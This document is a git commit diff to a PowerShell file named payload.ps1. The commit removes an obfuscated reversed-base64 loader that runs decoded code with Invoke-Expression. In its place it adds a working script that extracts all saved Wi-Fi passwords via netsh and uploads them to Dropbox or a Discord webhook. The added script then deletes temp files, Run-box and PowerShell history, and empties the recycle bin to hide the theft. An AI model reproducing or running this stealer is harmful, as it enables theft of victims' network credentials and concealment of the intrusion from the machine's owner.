4244d6bd853faf7d3ec1504ad5d0b59ca5370b3e
rude90 <115774095+rude90@users.noreply.github.com>
2023-06-26 10:07:16 -0700

    Update payload.ps1

--- payload.ps1
+++ payload.ps1
@@ -1,4 +1,86 @@
-$best64code = "=oQDlhXZuwGb15GXzRWYvxmb39GRcNWasJWdQx1cyV2cVxlODBiblRGZphEI31CIlhXZuwGblh2cyV2dvBnCNUGel5CbsVnbcNHZh9Gbud3bEx1YpxmY1BFXzJXZzVFX6MEIv1CIlhXZuMUWR5ESU9ibpFWbvcXYy9CdzVGdvATOlRWdy9SbvNmLiVHa0l2Zv8iOzBHd0hGIgkmc11CIydXagM3chBXeiBCcl1CIuVGZklGSgUGb5R3c39GZul2VtACbsVGazJXZ39GcK0gIzRWYvxmb39GRcNWasJWdQx1cyV2cVxlODJCIoRXYQ52bpNXdsNGeF1CIlNmblJXZmVmcQBXTtQGZBBiblRGZphEIlxWe0N3dvRmbpdVLgwGblh2cyV2dvBnCNISZ4VmLiAibvl2cuVGd4Vkbvl2c1x2Y4VULgU2YuVmclZWZyBFcN1CZkFEIuVGZklGSgUGb5R3c39GZul2VtACbsVGazJXZ39Gc"
-$base64 = $best64code.ToCharArray() ; [array]::Reverse($base64) ; -join $base64 2>&1> $null
-$LoadCode = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("$base64"))
-Invoke-Expression $LoadCode
+############################################################################################################################################################
+
+$wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String
+
+
+$wifiProfiles > $env:TEMP/--wifi-pass.txt
+
+############################################################################################################################################################
+
+# Upload output file to Dropbox
+
+function DropBox-Upload {
+
+[CmdletBinding()]
+param (
+	
+[Parameter (Mandatory = $True, ValueFromPipeline = $True)]
+[Alias("f")]
+[string]$SourceFilePath
+) 
+$outputFile = Split-Path $SourceFilePath -leaf
+$TargetFilePath="/$outputFile"
+$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
+$authorization = "Bearer " + $db
+$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
+$headers.Add("Authorization", $authorization)
+$headers.Add("Dropbox-API-Arg", $arg)
+$headers.Add("Content-Type", 'application/octet-stream')
+Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
+}
+
+if (-not ([string]::IsNullOrEmpty($db))){DropBox-Upload -f $env:TEMP/--wifi-pass.txt}
+
+############################################################################################################################################################
+
+function Upload-Discord {
+
+[CmdletBinding()]
+param (
+    [parameter(Position=0,Mandatory=$False)]
+    [string]$file,
+    [parameter(Position=1,Mandatory=$False)]
+    [string]$text 
+)
+
+$hookurl = "$dc"
+
+$Body = @{
+  'username' = $env:username
+  'content' = $text
+}
+
+if (-not ([string]::IsNullOrEmpty($text))){
+Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};
+
+if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
+}
+
+if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:TEMP/--wifi-pass.txt"}
+
+ 
+
+############################################################################################################################################################
+
+function Clean-Exfil { 
+
+# empty temp folder
+rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
+
+# delete run box history
+reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 
+
+# Delete powershell history
+Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue
+
+# Empty recycle bin
+Clear-RecycleBin -Force -ErrorAction SilentlyContinue
+
+}
+
+############################################################################################################################################################
+
+if (-not ([string]::IsNullOrEmpty($ce))){Clean-Exfil}
+
+
+RI $env:TEMP/--wifi-pass.txt
